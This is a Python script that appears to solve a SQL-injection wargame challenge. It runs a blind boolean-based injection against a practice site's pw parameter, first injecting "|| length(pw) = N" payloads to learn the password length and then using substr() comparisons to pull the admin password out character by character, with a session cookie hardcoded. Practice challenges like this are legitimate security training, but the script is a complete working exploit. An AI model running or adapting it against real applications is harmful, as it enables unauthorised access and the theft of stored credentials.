import requests
 
URL='https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
headers = {'Content-Type': 'application/json; charset=utf-8'}
cookies = {'PHPSESSID': 'p68istnh0anectj0ur6ttevv22'}
password = ''
length = 0;
 
for i in range(100):
    query={'pw': '\' || length(pw) = '+str(i)+' # '}
    res=requests.get(URL, params=query, headers=headers, cookies=cookies)
    if('Hello admin' in res.text):
        print(i)
        length=i
        break;
    
 
for i in range(length):
    for j in range(ord('0'),ord('z')+1):
        query={'pw': '\' || substr(pw,'+str(i+1)+',1) = \'' + chr(j)+ '\'#'}
        res=requests.get(URL, params=query, headers=headers, cookies=cookies)
        if('Hello admin' in res.text):
            password = password + chr(j)
            print(password)
            break;
